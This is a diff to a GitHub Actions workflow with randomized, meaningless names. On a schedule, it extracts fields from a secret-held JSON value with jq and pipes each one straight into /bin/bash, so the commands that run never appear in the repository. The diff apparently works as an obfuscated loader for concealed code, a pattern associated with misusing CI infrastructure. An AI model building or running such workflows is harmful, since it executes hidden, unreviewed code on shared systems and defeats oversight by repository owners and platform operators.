@@ -1,8 +1,10 @@
 name: liruicheng9876
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 5/6 * * *'
+    - cron: '52 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,10 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: liruicheng9876
         env:
-          ckw18274: ${{ secrets.ckw18274 }}
+          t046: ${{ secrets.t046 }}
         run: |
-          echo $ckw18274 | jq -r .w8561 | /bin/bash
-          echo $k9191 | jq -r .byxe2909 | /bin/bash
-          echo $xhea1 | jq -r .ts2484 | /bin/bash
-          echo $vz235 | jq -r .xfgt36767 | /bin/bash
+          echo $t046 | jq -r .am69722 | /bin/bash
+          echo $o3253 | jq -r .mqzb80321 | /bin/bash
+          echo $tkaga32793 | jq -r .yyy82 | /bin/bash
+          echo $we7 | jq -r .i0415 | /bin/bash
+          echo $wlna8 | jq -r .cbgyz69552 | /bin/bash
+          echo $t66 | jq -r .tfol402 | /bin/bash
+          echo $dbvmg160 | jq -r .l56 | /bin/bash
+          echo $mpmy90 | jq -r .l515 | /bin/bash
+          echo $cayxu02 | jq -r .al7878 | /bin/bash
 
